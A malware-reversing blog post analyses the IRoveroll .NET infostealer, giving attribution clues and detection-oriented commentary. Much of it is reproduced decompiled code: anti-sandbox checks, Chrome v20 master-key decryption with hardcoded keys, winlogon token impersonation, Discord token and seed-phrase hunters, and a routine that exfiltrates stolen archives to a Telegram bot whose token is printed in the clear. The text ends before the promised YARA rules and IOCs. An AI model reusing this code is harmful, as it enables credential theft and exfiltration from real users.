---
title: "IRoveroll: A Telegram-Exfiltrating Infostealer Hiding Behind svchost"
permalink: /blog/iroveroll-telegram-infostealer/
date: 2026-04-23 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [iroveroll, inqusitor-prod, infostealer, telegram, dotnet, stealer, credential-theft, chrome-v20, app-bound-encryption, yara]
image:
  path: /assets/images/social/iroveroll-2026.jpg
description: "Static analysis of a from-scratch .NET infostealer that masquerades as svchost.exe and exfiltrates 52 categories of stolen data to a Telegram bot. Covers MPRESS unpacking, Chrome v10/v20 App-Bound Encryption, winlogon token impersonation, Discord token theft, seed-phrase hunter, and a full capability boundary analysis."
---

A sample arrived in the threat intel queue named `svchost.zowner`. An uncommon extension paired with a binary name chosen to blend into Windows process lists. Initial triage flagged it as a potential RedLine variant, but decompilation told a different story: this is a from-scratch .NET infostealer whose author named it **IRoveroll**, shipped it under the brand "Inqusitor Prod," and chose Telegram as the sole exfiltration channel.

What makes this one worth a deep dive is not the Telegram trick (dozens of stealers do that) but the breadth of the target catalog. IRoveroll ships with 52 collection modules covering every major browser, messenger, game launcher, remote admin tool, FTP client, and cryptocurrency wallet. It handles Chrome's v20 App-Bound Encryption with all three key flavors (AES-GCM, ChaCha20-Poly1305, and an XOR-obfuscated AES variant). It impersonates winlogon to read SYSTEM-only DPAPI blobs. It masquerades as `svchost.exe` down to the PE version resource. And it leaks Russian-language strings in its error paths that give the author away.

This post walks through every stage: MPRESS unpacking, the config obfuscation, the anti-analysis gauntlet, the browser credential extraction pipeline for both v10 and v20 Chrome, Discord token theft including the `dQw4w9WgXcQ` encrypted-token format, the winlogon impersonation chain, and the Telegram exfiltration with chunking and migration handling. Full YARA rules, IOCs, and a Suricata signature at the end.

---

## Properties

| Property | Value |
|---|---|
| **Family** | IRoveroll (a.k.a. Inqusitor Prod) |
| **SHA-256** | `e7fcb6ab49296e69d1aa94091bb639a8ab3f69823ada857ab7fd5b3457a41867` |
| **MD5** | `91b2420da18f82c5792497425425c03e` |
| **SHA-1** | `7efdf5750fcad900c80e1dc58698f1c55c5766c0` |
| **File size** | 206,336 bytes (packed) |
| **File type** | PE32 .NET assembly (GUI, x86) |
| **Packer** | MPRESS (section names `.MPRESS1`, `.MPRESS2`) |
| **Runtime** | .NET Framework 4.7.2 |
| **Mutex** | `IMSEXYGIRL` |
| **C2 type** | Telegram Bot API |
| **PDB path** | `D:\Projects\Client\IRoveroll\obj\Release\svchost.pdb` |
| **PE timestamp** | 2090-03-11 (forged, 65 years in the future) |
| **Assembly MVID** | `92ec30d7-0389-4552-932b-9e5fb7b975d6` |
| **Collection modules** | 52 (`ITar` implementers) |

## Kill Chain

![IRoveroll Kill Chain Flowchart](/assets/images/posts/iroveroll/kill_chain.png)

---

## MPRESS Unpacking

The sample arrives packed with MPRESS, a commodity PE packer that compresses a .NET executable and restores it to memory at runtime. The section table gives it away:

```text
Section      VirtSize   RawSize   Entropy  Characteristics
.MPRESS1     0x00024000 0x00023e00 7.90    RX (code + compressed data)
.MPRESS2     0x000001de 0x00000200 3.12    RW (unpacker stub + IAT)
.rsrc        0x00000200 0x00000200 4.85    R (version info)
```

`.MPRESS1` entropy of 7.90 is the compressed payload. The unpacker stub in `.MPRESS2` restores the real PE in memory before jumping to the managed entry point. Unpacking is trivial with any of:

- `unmpress` (dedicated MPRESS unpacker)
- Scylla / PE-sieve snapshots after OEP discovery
- A simple .NET-aware unpacker that runs the process in a sandboxed AppDomain and dumps the loaded assembly

After unpacking, the real .NET metadata is exposed. The assembly title `Inqusitor Prod`, the description `Disable defender and antivirus softwares`, and the PDB path `D:\Projects\Client\IRoveroll\obj\Release\svchost.pdb` are all present in the unpacked image. The project folder is named `IRoveroll`, which becomes the root .NET namespace for every class in the binary.

---

## Identity Theft at the PE Level

The author made a deliberate effort to make this sample look like a legitimate Windows binary. The PE version resource reads:

```text
Comments:         Disable defender and antivirus softwares
CompanyName:      Alsu Software
FileDescription:  Inqusitor Prod
FileVersion:      15.16.11.3
InternalName:     svchost.exe
LegalTrademark:   Inqusitor Inc
OriginalFilename: svchost.exe
ProductName:      Inqusitor Prod
```

Two details stand out. First, the `FileVersion` field contains `15.16.11.3`, which is an IPv4 address embedded as metadata. The author reuses a version-string slot as an infrastructure indicator, perhaps for a secondary feature that was planned but never wired in (there is no code path in the binary that reads this field at runtime). Second, the `Comments` field openly states the binary's purpose. This is never shown to a victim.

The PE timestamp was set to March 11, 2090, a deliberate future date chosen to break automated triage pipelines that sort samples by compilation date. The Rich Header products place the real compilation in late 2024 or early 2025.

---

## Execution Flow

The `Main()` method is small and calls into higher-level orchestration:

```csharp
// IRoveroll.S__T___e___aaa___ll_er.Main
[STAThread]
public static void Main()
{
    ServicePointManager.Expect100Continue = true;
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    ServicePointManager.DefaultConnectionLimit = 9999;

    MutexControl.CreateMutex();                                 // IMSEXYGIRL
    Config.Init();                                              // decode Telegram creds
    ProcessKiller.KillerAll();                                  // kill 65 targets
    StaticReference.loadBrowsers();                             // enumerate installs
    SendToTelegram(CollectLogs(), Environment.UserName);        // exfil
    AutoDel();                                                  // delete self
    Environment.Exit(0);
}
```

Note the TLS 1.2 enforcement and the 9,999 connection ceiling. The author assumed aggressive parallelism would saturate the default `HttpClient` limit and raised it preemptively. The class name `S__T___e___aaa___ll_er` is an obfuscated spelling of "Stealer" that survives compilation -- a lazy renaming that still resolves to a single match on any `grep`.

### 1. Mutex and Config Initialization

`CreateMutex` registers the global mutex `IMSEXYGIRL`. If the mutex already exists, the process silently exits -- preventing parallel executions on the same host.

`Config.Init()` is where the Telegram credentials live. Rather than storing the bot token and chat ID as plaintext strings, the author splits them into individual base64-encoded characters and concatenates them at runtime:

```csharp
// IRoveroll.Config.Init -- the "obfuscated" config
public static void Init()
{
    CHAT_ID = Decode("LQ==") + Decode("MQ==") + Decode("MA==") + Decode("MA==")
            + Decode("Mw==") + Decode("OA==") + Decode("MA==") + Decode("OQ==")
            + Decode("Ng==") + Decode("NA==") + Decode("Mw==") + Decode("Mw==")
            + Decode("OQ==");
    BOT_TOKEN = Decode("ODM5MzgyOTQ4NzpBQUUzeFpnZWwtR2Z6Y2NtNHNhUEJKdU5Fb0JxaFhSOFpsSQ==");
}

public static string Decode(string base64)
{
    return Encoding.UTF8.GetString(Convert.FromBase64String(base64));
}
```

Decoded values:

- **CHAT_ID**: `-100380964339` (supergroup ID, 13 single-character decodes concatenated)
- **BOT_TOKEN**: `8393829487:AAE3xZgel-Gfzccm4saPBJuNEoBqhXR8ZlI`

The character-by-character base64 obfuscation only adds noise to string scanners. Any decompiler resolves `Config.Init` in seconds. The full chat ID is reconstructed at class init time as a single string.

### 2. Anti-Analysis Gauntlet

Before any theft occurs, `VirtualAssistant.CheckOrExit()` runs a battery of seven environment checks. If any returns true, it throws an exception that propagates up to kill the process:

```csharp
// IRoveroll.Util.VirtualAssistant -- full anti-analysis gauntlet
internal static class VirtualAssistant
{
    public static void CheckOrExit()
    {
        if (ProccessorCheck())    throw new Exception();  // CPU cores <= 1
        if (CheckMemory())        throw new Exception();  // RAM < 2 GB
        if (CheckDriveSpace())    throw new Exception();  // C: < 50 GB
        if (CheckUserConditions()) throw new Exception(); // username blocklist
        if (CheckCache())         throw new Exception();  // no Win32_CacheMemory
        if (CheckFileName())      throw new Exception();  // filename contains "sandbox"
        if (CheckCim())           throw new Exception();  // no CIM_Memory objects
    }

    public static bool ProccessorCheck() =>
        Environment.ProcessorCount <= 1;

    public static bool CheckDriveSpace() =>
        new DriveInfo("C").TotalSize / 1073741824 < 50;

    public static bool CheckMemory() =>
        Convert.ToDouble(new ManagementObjectSearcher("Select * From Win32_ComputerSystem")
            .Get().Cast<ManagementObject>().FirstOrDefault()["TotalPhysicalMemory"])
            / 1048576.0 < 2048.0;  // < 2 GB RAM

    public static bool CheckCache() =>
        new ManagementObjectSearcher("Select * from Win32_CacheMemory").Get().Count == 0;

    public static bool CheckCim() =>
        new ManagementObjectSearcher("Select * from CIM_Memory").Get().Count == 0;

    public static bool CheckFileName() =>
        Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)
            .ToLower().Contains("sandbox");

    public static bool CheckUserConditions()
    {
        string user = Environment.UserName.ToLower();
        string machine = Environment.MachineName.ToLower();
        string[] blocked = { "sandbox", "malware", "virus", "sample",
                             "test", "analysis", "cuckoo", "joe" };
        foreach (var s in blocked)
            if (user.Contains(s) || machine.Contains(s)) return true;
        if (user.Contains("wdag") || user.Contains("utilityaccount")) return true;
        if (user.Length <= 3 && !user.Equals("admin", StringComparison.OrdinalIgnoreCase))
            return true;
        return false;
    }
}
```

The `wdag` and `utilityaccount` checks specifically target Windows Defender Application Guard containers, which auto-provision usernames starting with one of those prefixes. The WMI-based `Win32_CacheMemory` and `CIM_Memory` checks catch hypervisors that expose no hardware cache objects, which many default sandbox configurations do. The username length check under 4 characters is a heuristic against lab-provisioned accounts like `vm`, `lab`, `sbx`.

**Bypass note:** every check is a userland call. A single IL patch that replaces `throw new Exception()` with `return` in `CheckOrExit` neutralizes the whole gauntlet.

![Anti-analysis gauntlet](/assets/images/posts/iroveroll/anti_analysis.png)
*Seven sequential checks. Any failure throws and kills the process before collection begins.*

### 3. Process Termination (65 Targets)

With the environment validated, `ProcessKiller.KillerAll()` kills 65 target processes in parallel. The list covers every major Chromium and Gecko browser, plus Telegram and Steam:

```csharp
public static string[] Targets = new string[65]
{
    "thunderbird.exe", "icedragon.exe", "cyberfox.exe", "blackhawk.exe", "palemoon.exe",
    "ghostery.exe", "undetectable.exe", "sielo.exe", "conkeror.exe", "msedge.exe",
    "netscape.exe", "seamonkey.exe", "slimbrowser.exe", "msedge_pwa_launcher.exe", "avant.exe",
    "opera.exe", "operagx.exe", "msedgewebview2.exe", "msedgewebview.exe", "chromium.exe",
    "slimjet.exe", "chrome.exe", "browser.exe", "vivaldi.exe", "brave.exe",
    "edge.exe", "microsoft.exe", "dragon.exe", "torch.exe", "mozila.exe",
    "yandex.exe", "sputnik.exe", "nichrome.exe", "msedge_proxy.exe", "cocbrowser.exe",
    "uran.exe", "msedge_proxy.exe", "chromodo.exe", "atom.exe", "bravebrowser.exe",
    "steam.exe", "cryptotab.exe", "ghostbrowser.exe", "maelstrom.exe", "kinza.exe",
    "globus.exe", "falkon.exe", "elementbrowser.exe", "colibri.exe", "whale.exe",
    "avastbrowser.exe", "ucbrowser.exe", "maxthon.exe", "blisk.exe", "aolshield.exe",
    "baidubrowser.exe", "ccleanerbrowser.exe", "hola.exe", "xvast.exe", "kingpin.exe",
    "qqbrowser.exe", "private_browsing.exe", "chrome_pwa_launcher.exe",
    "chrome_proxy.exe", "telegram.exe"
};
```

The kill routine builds a HashSet of wanted names (including `.exe`-stripped variants), enumerates all processes via `EnumProcesses`, opens each with `PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE` rights, and calls `TerminateProcess` via `NativeMethods`. The motivation is pragmatic: Chromium browsers hold credentials in SQLite databases that are locked by the browser process. Killing the browser before reading `Login Data` is the standard technique for bypassing file-lock errors, and Telegram's `tdata` directory is only safe to copy when the client is not running.

Notice the duplicate `msedge_proxy.exe` entry at indices 33 and 36 -- a copy-paste bug in the author's build that stayed in the final binary.

### 4. Parallel Collection Pipeline

The central orchestrator `CollectLogs()` dispatches 52 modules across a thread pool and collects their outputs into a single in-memory ZIP:

```csharp
// IRoveroll.S__T___e___aaa___ll_er.CollectLogs
private static byte[] CollectLogs()
{
    ZipArchiveMemory zip = new ZipArchiveMemory();
    Counter counter = new Counter();
    Task.WaitAll(new Task[1] { Task.Run(delegate
    {
        Parallel.ForEach(Targets, delegate(ITar target)
        {
            try { target.Collect(zip, counter); }
            catch { }  // swallow any module failure
        });
    }) });
    counter.Collect(zip);                      // add summary file
    return zip.ToArray();
}
```

The `Targets` list is a static array of 52 `ITar` implementations, each with a single `Collect(ZipArchiveMemory zip, Counter counter)` method. Exceptions inside any module are swallowed, so a single misbehaving target never kills the whole run. The `ZipArchiveMemory` is a thread-safe in-memory ZIP container that accepts entries from all modules concurrently.

The 52 modules split into seven categories:

![Collection pipeline](/assets/images/posts/iroveroll/collection_pipeline.png)
*Parallel.ForEach dispatches every ITar module concurrently. Each module writes into a thread-safe in-memory ZIP.*


| Category | Modules |
|---|---|
| **Browsers** | `Chro_mium`, `Gecko`, `CryptoChromium`, `CryptoGecko`, `InstalledBrowsers` |
| **Messengers** | `Discord`, `Element`, `Jabber`, `Telegram`, `Tox`, `Viber` |
| **Games** | `BattleNet`, `ElectronicArts`, `Epic`, `Minecraft`, `Riot`, `Roblox`, `Steam`, `Uplay`, `GameList` |
| **Remote admin / FTP** | `AnyDesk`, `CoreFTP`, `CyberDuck`, `DynDns`, `FileZilla`, `FTPCommander`, `FTPGetter`, `FTPNavigator`, `FTPRush`, `JetBrains`, `MobaXterm`, `Navicat`, `Ngrok`, `NoIp`, `PlayIt`, `PuTTY`, `RDCMan`, `Rdp`, `Sunlogin`, `TeamSpeak`, `TeamViewer`, `TotalCommander`, `WinSCP`, `Xmanager` |
| **Email / productivity** | `FoxMail`, `Obs`, `GithubGui` |
| **Crypto wallets** | `CryptoDesktop` (12 desktop wallets), `CryptoChromium`, `CryptoGecko` (browser extension wallets) |
| **System / screenshot** | `SysInfo`, `InstalledPrograms`, `ProcessDump`, `ImageGrabber`, `Grabber`, `UserAgentGenerator` |

### 5. Browser Credential Extraction

The `Chro_mium` module iterates every installed Chromium-based browser and its profiles. For each profile it reads seven SQLite databases:

| Database | Table | Content |
|---|---|---|
| `Login Data` | `logins` | Saved passwords |
| `Login Data For Account` | `logins` | Account-sync passwords |
| `Network\Cookies` | `cookies` | Session cookies |
| `Web Data` | `autofill`, `credit_cards`, `token_service`, `masked_credit_cards`, `masked_ibans` | Autofill, cards, OAuth tokens |
| `Ya Passman Data` | `logins` | Yandex Password Manager (Yandex Browser only) |
| `Ya Credit Cards` | `records` | Yandex credit cards (Yandex Browser only) |

Before reading each DB, the corresponding browser process is killed via `ProcessKiller.Kill(browserName)` to release the file lock.

### 6. Chrome v10 and v20 Encryption

This is where IRoveroll separates from the crowd of commodity stealers. Chrome's encryption has gone through two major revisions:

- **v10 (DPAPI + AES-GCM):** The master key is stored in `Local State` under `encrypted_key`, DPAPI-wrapped. Anyone logged in as the victim user can decrypt it. All commodity stealers handle this.
- **v20 (App-Bound Encryption, 2024):** The master key is additionally protected by a system-level CNG key named `Google Chromekey1`, scoped to the Chrome process identity. Reading it requires SYSTEM privileges or a process with access to that key's audit path. Most commodity stealers fail on v20.

IRoveroll handles both. The v10 path is a three-line DPAPI unwrap:

```csharp
// IRoveroll.Data.LocalState.ComputeMasterKeyV10 -- classic DPAPI path
private static byte[] ComputeMasterKeyV10(string localstate)
{
    Match match = Regex.Match(LocalStateContent(localstate),
                              "\"encrypted_key\":\"(.*?)\"");
    if (!match.Success) return null;
    byte[] blob = Convert.FromBase64String(match.Groups[1].Value)
                         .Skip(5).ToArray();   // strip "DPAPI" prefix
    return DpApi.Decrypt(blob);                // CryptUnprotectData
}
```

The v20 path is much more involved. It impersonates winlogon (SYSTEM), double-unwraps the blob through DPAPI, parses the resulting TLV structure, and then handles four different cipher flags:

```csharp
// IRoveroll.Data.LocalState.ComputeMasterKeyV20 -- App-Bound Encryption
private static byte[] ComputeMasterKeyV20(string localstate)
{
    Match match = Regex.Match(LocalStateContent(localstate),
        "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
    if (!match.Success) return null;

    // Strip the 4-byte "APPB" prefix, then double-unwrap as SYSTEM
    byte[] appb = Convert.FromBase64String(match.Groups[1].Value).Skip(4).ToArray();
    byte[] parsed = DecryptAsSystemUser(appb);  // 2x CryptUnprotectData as winlogon
    BlobParsedData blob = ParseKeyBlob.Parse(parsed);

    switch (blob.Flag)
    {
        case 1:  // AES-GCM with a hardcoded 32-byte key
            return AesGcm256.Decrypt(new byte[32] {
                179, 28,110, 36, 26,200, 70,114,141,169,193,250,196,147,102, 81,
                207,251,148, 77, 20, 58,184, 22, 39,107,204,109,160, 40, 71,135
            }, blob.Iv, null, blob.Ciphertext, blob.Tag);

        case 2:  // ChaCha20-Poly1305 with a different hardcoded 32-byte key
            return ChaCha20Poly1305.Decrypt(new byte[32] {
                233,143, 55,215,244,225,250, 67, 61, 25, 48, 77,194, 37,128, 66,
                  9, 14, 45, 29,126,234,118,112,212, 31,115,141,  8,114,150, 96
            }, blob.Iv, blob.Ciphertext, blob.Tag);

        case 3:  // CNG-decrypt + XOR mask + AES-GCM
        {
            byte[] mask = new byte[32] {
                204,248,161,206,197,102,  5,184, 81,117, 82,186, 26, 45,  6, 28,
                  3,162,158,144, 39, 79,178,252,245,155,164,183, 92, 57, 35,144
            };
            byte[] aesKey = CDecryptor(blob.EncryptedAesKey);  // NCryptDecrypt w/ "Google Chromekey1"
            for (int i = 0; i < aesKey.Length; i++)
                aesKey[i] ^= mask[i];                          // XOR with embedded mask
            return AesGcm256.Decrypt(aesKey, blob.Iv, null, blob.Ciphertext, blob.Tag);
        }

        case 32:
            return blob.EncryptedAesKey;  // plaintext (older Chrome)

        default:
            return null;
    }
}
```

Three hardcoded 32-byte keys are present in plaintext. These are the **per-release Chrome constants** that the Chromium team bakes into the binary to XOR-mask the raw encrypted key during parsing. IRoveroll carries its own copies because they must match the Chrome release that produced the blob. When Chrome updates these constants, this stealer breaks on new installs until the author rebuilds.

The CNG decryption path is the key innovation. It calls `NCryptOpenStorageProvider("Microsoft Software Key Storage Provider")`, opens the key `Google Chromekey1`, and calls `NCryptDecrypt` inside a `using` block that impersonates winlogon:

```csharp
// IRoveroll.Cryptography.CngDecryptor.Decrypt -- SYSTEM-scoped CNG unwrap
public static byte[] Decrypt(byte[] inputData,
    string providerName = "Microsoft Software Key Storage Provider",
    string keyName = "Google Chromekey1")
{
    IntPtr phProvider = IntPtr.Zero;
    IntPtr phKey = IntPtr.Zero;
    try
    {
        int st = NativeMethods.NCryptOpenStorageProvider(out phProvider, providerName, 0);
        if (st != 0) throw new Exception($"Ошибка NCryptOpenStorageProvider: Код {st}");

        st = NativeMethods.NCryptOpenKey(phProvider, out phKey, keyName, 0, 0);
        if (st != 0) throw new Exception($"Ошибка NCryptOpenKey: Код {st}");

        // Two-call pattern: first call to get size, second to actually decrypt
        int size;
        st = NativeMethods.NCryptDecrypt(phKey, inputData, inputData.Length,
                                         IntPtr.Zero, null, 0, out size, 64);
        if (st != 0) throw new Exception($"Ошибка определения размера NCryptDecrypt: Код {st}");

        byte[] output = new byte[size];
        st = NativeMethods.NCryptDecrypt(phKey, inputData, inputData.Length,
                                         IntPtr.Zero, output, output.Length, out size, 64);
        if (st != 0) throw new Exception($"Ошибка NCryptDecrypt: Код {st}");
        Array.Resize(ref output, size);
        return output;
    }
    finally
    {
        if (phKey != IntPtr.Zero) NativeMethods.NCryptFreeObject(phKey);
        if (phProvider != IntPtr.Zero) NativeMethods.NCryptFreeObject(phProvider);
    }
}
```

The `NCRYPT_SILENT_FLAG = 64` argument suppresses any UI prompts. Note the Cyrillic error messages (`Ошибка`, Russian for "Error") -- a consistent attribution signal across the crypto and impersonation classes.

### 7. Privilege Escalation via Winlogon Impersonation

To read the v20 `app_bound_encrypted_key` successfully, IRoveroll impersonates `winlogon.exe`, which runs as SYSTEM:

```csharp
// IRoveroll.Util.ImpersonationHelper -- full winlogon impersonation chain
public static IDisposable ImpersonateWinlogon()
{
    EnableDebugPrivilege();  // AdjustTokenPrivileges(SeDebugPrivilege)

    Process winlogon = Process.GetProcessesByName("winlogon").FirstOrDefault()
                       ?? throw new Exception("Процесс winlogon.exe не найден");

    // Open winlogon's token with TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY = 14
    NativeMethods.OpenProcessToken(winlogon.Handle, 14u, out IntPtr hToken);

    // Duplicate as SecurityImpersonation (2), TokenImpersonation (2)
    NativeMethods.DuplicateTokenEx(hToken, 12u, IntPtr.Zero, 2u, 2u, out IntPtr hNew);

    NativeMethods.ImpersonateLoggedOnUser(hNew);
    return new ImpersonationContext();  // RevertToSelf() on Dispose
}
```

The impersonation is short-lived. It is scoped inside a `using` block to read the app-bound key blob, after which `RevertToSelf` is called and normal user privileges resume. This narrows the window for detection -- a process elevation detector only catches the brief period during `NCryptDecrypt`.

The error message `"Процесс winlogon.exe не найден"` is Russian for "Process winlogon.exe not found." Combined with the `Ошибка` prefixes in the CngDecryptor, this puts the author's Russian keyboard layout on the binary.

### 8. Discord Token Theft

The `Discord` module searches LevelDB files in every Discord variant's local storage directory. It extracts tokens using two regular expressions:

```csharp
// IRoveroll.Tar_gets.Msg.Discord -- token regex definitions
private static readonly Regex _tokenRegex = new Regex(
    "(mfa\\.[\\w-]{80,})|((MT|OD)[\\w-]{22,24}\\.[\\w-]{6}\\.[\\w-]{25,110})",
    RegexOptions.IgnoreCase | RegexOptions.Compiled);

private static readonly Regex _encryptedRegex = new Regex(
    "\"dQw4w9WgXcQ:([^\"]+)\"",
    RegexOptions.IgnoreCase | RegexOptions.Compiled);
```

The first regex matches two legacy formats: MFA tokens (`mfa.` prefix with an 80+ character body), and standard bot/user tokens (base64-segmented with a time-encoded middle and signature).

The second regex -- `dQw4w9WgXcQ:` -- is a famous Discord easter egg (the YouTube video ID for Rick Astley's "Never Gonna Give You Up") that Discord uses as a magic prefix for encrypted tokens stored in the "protected storage" format introduced in late 2023. Tokens matching this pattern are decrypted with the same DPAPI + AES-GCM pipeline that Chromium browsers use for saved passwords:

```csharp
// Discord encrypted-token decryption
byte[] key = LocalState.MasterKeyV10(localstate);  // DPAPI-unwrapped AES key
if (key == null) return distinctTokens.Distinct().ToList();

Parallel.ForEach(tokensEncrypted.Distinct(), delegate(string encrypted)
{
    try
    {
        byte[] ct = Convert.FromBase64String(encrypted);
        byte[] pt = AesGcm.DecryptBrowser(ct, key, null, checkprefix: false);
        if (pt != null)
            distinctTokens.Add(Encoding.UTF8.GetString(pt).Trim());
    }
    catch { }
});
```

The module also scans every installed Chromium browser profile for Discord tokens stored in browser `Local Storage\leveldb`. Discord Web stores the token in the same DOM local-storage format that websites use, and the stealer strips it from there too.

### 9. Hardware Fingerprinting

Before sending, the stealer generates a stable HWID by collecting hardware identifiers in parallel and SHA-256-hashing them:

```csharp
// IRoveroll.Util.HwidGenerator.GetHwid (abridged)
public static string GetHwid()
{
    string mg = null, cpuName = null;
    List<string> vols = null, macs = null;

    Task.WaitAll(new Task[4]
    {
        Task.Run(delegate { mg      = GetMachineGuid(); }),
        Task.Run(delegate { cpuName = GetCpuName(); }),
        Task.Run(delegate { vols    = GetFixedVolumeSerials(); }),
        Task.Run(delegate { macs    = GetMacAddresses(); })
    });

    var parts = new List<string>();
    if (!string.IsNullOrEmpty(mg))      parts.Add("MG:"   + mg);
    if (!string.IsNullOrEmpty(cpuName)) parts.Add("CPU:"  + cpuName);
    parts.Add("Cores:" + Environment.ProcessorCount);
    if (vols?.Count > 0) parts.Add("VOLS:" + string.Join(",", vols));
    if (macs?.Count > 0) parts.Add("MACS:" + string.Join(",", macs));
    parts.Add("MN:" + Environment.MachineName);

    return ComputeSha256(string.Join("|", parts));
}
```

Sources used (via `Microsoft.Win32.Registry` and `NetworkInterface` APIs):

- `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`
- `HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString`
- `GetVolumeInformation` for every fixed drive (volume serial only, not disk serial)
- All UP/MAC-excluding MAC addresses (excludes loopback and virtual adapters)
- `Environment.MachineName`

This fingerprint appears in the `Information.txt` file inside every exfiltrated archive, letting the operator correlate logs from the same machine across multiple runs or reinstalls.

### 10. Exfiltration via Telegram Bot API

Everything the 52 modules collected is packed into a single in-memory ZIP and sent to the Telegram channel via `sendDocument`. The send routine handles three production concerns: chunking for files larger than Telegram's 47 MB per-document limit, retrying on transient failures, and transparently following `migrate_to_chat_id` responses when a group is upgraded to a supergroup.

```csharp
// IRoveroll.S__T___e___aaa___ll_er.SendToTelegram -- chunked upload
private const int ChunkSize = 47185920;  // 45 MB * 1024 * 1024 / 1 byte overhead safety
private const int MaxRetries = 3;
private const int RetryDelayMs = 2000;

public static void SendToTelegram(byte[] fileData, string fileName)
{
    long chatId = long.Parse(Config.CHAT_ID);
    int num = (int)Math.Ceiling((double)fileData.Length / 47185920.0);
    for (int i = 0; i < num; i++)
    {
        int offset = i * 47185920;
        int length = Math.Min(47185920, fileData.Length - offset);
        byte[] chunk = new byte[length];
        Buffer.BlockCopy(fileData, offset, chunk, 0, length);
        string chunkName = $"{fileName}_log_[{i + 1}-{num}]";
        SendSinglePart(chunk, chunkName, i + 1, num, ref chatId);
    }
}

private static void SendSinglePart(byte[] data, string fileName,
                                   int part, int total, ref long chatId)
{
    string url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendDocument";
    for (int i = 1; i <= 3; i++)  // MaxRetries = 3
    {
        try
        {
            using var form = new MultipartFormDataContent();
            form.Add(new StringContent(chatId.ToString()), "chat_id");
            form.Add(new StringContent(
                $"[{part}/{total}] LOG - {Environment.UserName} @ {Environment.MachineName}"),
                "caption");
            var content = new ByteArrayContent(data);
            content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/octet-stream");
            form.Add(content, "document", fileName);

            HttpResponseMessage r = HttpClient.PostAsync(url, form).GetAwaiter().GetResult();
            string body = r.Content.ReadAsStringAsync().GetAwaiter().GetResult();

            if (r.IsSuccessStatusCode) break;

            // Handle Telegram group-to-supergroup migration
            if (TryGetMigratedChatId(body, out var newId))
            {
                chatId = newId;
                i--;   // do not consume a retry on migration
            }
            else if (i == 3) throw new Exception("Telegram error: " + body);
        }
        catch (Exception ex)
        {
            if (ex is HttpRequestException &&
                ex.Message.Contains("migrate_to_chat_id") &&
                TryGetMigratedChatId(ex.Message, out var newId2))
            {
                chatId = newId2;
                i--;
                continue;
            }
            if (i == 3) throw;
            Thread.Sleep(2000);
        }
    }
}
```

The caption format `[n/total] LOG - username @ machinename` gives the operator an immediate read on the victim's identity without opening the ZIP. The `TryGetMigratedChatId` helper parses a `migrate_to_chat_id` error body (returned when a group is upgraded to a supergroup) and updates the chat ID in place, then decrements the retry counter so the migration does not burn a retry attempt. This is the kind of robustness detail you see from developers who have operated Telegram bots in production rather than grabbing a tutorial snippet.

![Telegram exfiltration flow](/assets/images/posts/iroveroll/telegram_exfil.png)
*Chunked upload with retry, migration handling, and timed self-delete after successful exfiltration.*

### 11. Seed-Phrase Hunter (The `Grabber` Module)

The `Grabber` module is the most aggressive collection module in the binary. It recursively walks 19 directories (local, cloud-sync, and note-taking apps), reads every file under 600 KB with a wallet-related extension, and keeps any file whose name or content matches a BIP39 seed phrase or a 35-word credential keyword list:

```csharp
// IRoveroll.Tar_gets.Crypto.Grabber -- seed phrase and credential file hunter
private readonly long _sizeMinFile   = 120L;
private readonly long _sizeLimitFile = 614040L;   // ~600 KB per file
private readonly long _sizeLimit     = 524288000L; // 500 MB total cap

// BIP39 detector: 12 to 24 lowercase words, 3+ chars each, whitespace-only separators
private readonly Regex _seedRegex = new Regex(
    "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);

private readonly string[] _keywords = {
    "password", "passwd", "pwd", "pass", "login", "user", "username", "account",
    "mail", "email", "secret", "key", "private", "public", "wallet", "mnemonic",
    "seed", "recovery", "phrase", "backup", "pin", "auth", "2fa", "token",
    "apikey", "api_key", "ssh", "cert", "certificate", "crypto",
    "btc", "eth", "usdt", "ltc", "xmr"
};

private readonly string[] _blacklist = {
    "license", "readme", "changelog", "about", "terms",
    "eula", "notice", "example", "sample", "test"
};

private readonly string[] _seedExtensions = {
    ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key",
    ".secret", ".txt", ".backup", ".wallet"
};
```

The scan paths include every common place a careless user might drop a wallet backup:

```text
%USERPROFILE%\Documents
%USERPROFILE%\Desktop
%PUBLIC%\Documents
%PUBLIC%\Desktop
%USERPROFILE%\Downloads
%USERPROFILE%\OneDrive
%USERPROFILE%\Dropbox
%USERPROFILE%\iCloudDrive
%USERPROFILE%\Google Drive
%USERPROFILE%\YandexDisk
%USERPROFILE%\Mega
%APPDATA%\Evernote
%APPDATA%\Standard Notes
%APPDATA%\Joplin
%USERPROFILE%\Wallets
%USERPROFILE%\Keys
%USERPROFILE%\Crypto
%USERPROFILE%\Backup
```

The BIP39 regex is a textbook implementation. Any file consisting only of 12 to 24 whitespace-separated lowercase words of 3+ characters gets flagged. The whitelist/blacklist word check is parallelized with an early-exit on blacklist hit (`license`, `readme`, etc.) to avoid accidentally exfiltrating software documentation. This module alone explains why `Grabber` is in the target list instead of relying only on `CryptoDesktop` -- a user who saved a MetaMask recovery phrase into a `.txt` on their Desktop would be caught here even without a configured wallet.

### 12. File Grabber from Telegram Desktop Downloads (The `ImageGrabber` Module)

Despite the name, `ImageGrabber` is a **targeted file exfiltrator**, not a screenshot tool. It reads `%USERPROFILE%\Downloads\Telegram Desktop` and grabs every file matching one of ten extensions:

```csharp
// IRoveroll.Tar_gets.ImageGrabber -- Telegram downloads file harvester
private readonly string[] strings = {
    ".jpg", ".jpeg", ".png",   // photos (sometimes screenshots of credentials)
    ".rdp",                    // Remote Desktop shortcut (credential material)
    ".env",                    // dotenv files with API keys and secrets
    ".session",                // Telethon/Pyrogram auth session files
    ".ssh",                    // SSH key/config files
    ".mafile",                 // Steam mobile authenticator backup
    ".config",                 // generic config files
    ".kdbx"                    // KeePass password database
};

private readonly long _sizeLimit = 524288000L;  // 500 MB cap
```

